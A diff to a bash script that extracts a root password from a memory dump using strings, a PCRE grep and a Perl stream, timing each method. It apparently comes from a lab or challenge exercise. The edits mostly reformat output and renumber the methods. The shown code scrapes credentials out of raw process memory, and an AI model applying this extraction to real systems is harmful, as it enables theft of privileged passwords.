@@ -37,26 +37,23 @@ for ((i=0; i<MAX_WAIT*2; i++)); do          # 0.5-s steps → MAX_WAIT seconds
   sleep 0.5
 done
 
-echo "# 3  extract password - 3 methods - 1 skipped"
+echo "# 3  extract password"
 
-# Skipping this reference method, as it's too slow
-# 3.0  strings scan (≈ 40 s)
+# 3.1  strings scan (≈ 40 s) - REFERENCE ONLY
 # start=$(date +%s%3N)
 # pw_strings=$(strings -n 3 "$DUMP" |
 #              grep -Eo '"pass"[[:space:]]*:[[:space:]]*"[a-z]+-[a-z]+-[a-z]+"' |
 #              head -n1 | cut -d'"' -f4)
 # end=$(date +%s%3N)
-# printf "# 3.0  done in %.3f s (strings scan)\n" "$(bc <<< "scale=3; ($end-$start)/1000")"
-# echo "root password (strings): $pw_strings"
+# printf "✓ - root password: %s (strings %.3f s)\n" "$pw_strings" "$(bc <<< "scale=3; ($end-$start)/1000")"
 
-# 3.1  PCRE grep (≈ 6 s)
+# 3.2  PCRE grep (≈ 6 s)
 start=$(date +%s%3N)
 pw_pcre=$(grep -aPzo -m1 '"pass"\s*:\s*"\K[a-z]+-[a-z]+-[a-z]+' "$DUMP" | tr -d '\0')
 end=$(date +%s%3N)
-printf "# 3.1  done in %.3f s (PCRE)\n" "$(bc <<< "scale=3; ($end-$start)/1000")"
-echo "root password (PCRE):   $pw_pcre"
+printf "✓ - root password: %s (PCRE %.3f s)\n" "$pw_pcre" "$(bc <<< "scale=3; ($end-$start)/1000")"
 
-# 3.2  Perl stream (≈ 0.4 s)
+# 3.3  Perl stream (≈ 0.4 s)
 start=$(date +%s%3N)
 pw_perl=$(perl - <<'PERL' "$DUMP"
 use strict;
@@ -67,7 +64,6 @@ while (<>) {
 PERL
 )
 end=$(date +%s%3N)
-printf "# 3.2  done in %.3f s (Perl stream)\n" "$(bc <<< "scale=3; ($end-$start)/1000")"
-echo "root password (Perl):   $pw_perl"
+printf "✓ - root password: %s (Perl %.3f s)\n" "$pw_perl" "$(bc <<< "scale=3; ($end-$start)/1000")"
 
 rm -f "$DUMP"
